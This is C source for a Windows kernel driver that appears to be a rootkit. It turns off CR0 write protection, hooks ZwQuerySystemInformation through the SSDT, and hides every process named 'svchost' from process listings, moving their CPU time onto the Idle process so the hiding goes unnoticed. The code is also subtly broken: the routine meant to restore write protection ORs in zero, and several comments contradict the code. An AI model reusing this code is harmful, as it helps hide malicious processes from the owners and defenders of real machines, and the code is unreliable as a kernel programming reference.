#include "hookssdt.h"

KIRQL WPOFFx64()
{
	KIRQL irql = KeRaiseIrqlToDpcLevel();
	UINT64 cr0 = __readcr0();
	cr0 &= 0xFFFFFFFFFFFEFFFF;
	__writecr0(cr0);
	_disable();
	return irql;
}

void WPONx64(KIRQL irql)
{
	UINT64 cr0 = __readcr0();
	cr0 |= !0xFFFFFFFFFFFEFFFF;
	_enable();
	__writecr0(cr0);
	KeLowerIrql(irql);
}

NTSTATUS NewZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength)
{

	NTSTATUS ntStatus;

	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (NT_SUCCESS(ntStatus))
	{
		// Asking for a file and directory listing
		if (SystemInformationClass == 5)
		{
			// This is a query for the process list.
			// Look for process names that start with
			// '_root_' and filter them out.

			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;

			while (curr)
			{
				//Ktrace("Current item is %x\n", curr);
				if (curr->ProcessName.Buffer != NULL)
				{
					if (0 == memcmp(curr->ProcessName.Buffer, L"svchost", 14))
					{
						m_UserTime.QuadPart += curr->UserTime.QuadPart;
						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

						if (prev) // Middle or Last entry
						{
							if (curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;
							else	// we are last, so make prev the end
								prev->NextEntryDelta = 0;
						}
						else
						{
							if (curr->NextEntryDelta)
							{
								// we are first in the list, so move it forward
								(char *)SystemInformation += curr->NextEntryDelta;
							}
							else // we are the only process!
								SystemInformation = NULL;
						}
					}
				}
				else // This is the entry for the Idle process
				{
					// Add the kernel and user times of _root_* 
					// processes to the Idle process.
					curr->UserTime.QuadPart += m_UserTime.QuadPart;
					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

					// Reset the timers for next time we filter
					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
				}
				prev = curr;
				if (curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
				else curr = NULL;
			}
		}
		else if (SystemInformationClass == 8) // Query for SystemProcessorTimes
		{
			struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
			times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
		}

	}
	return ntStatus;
}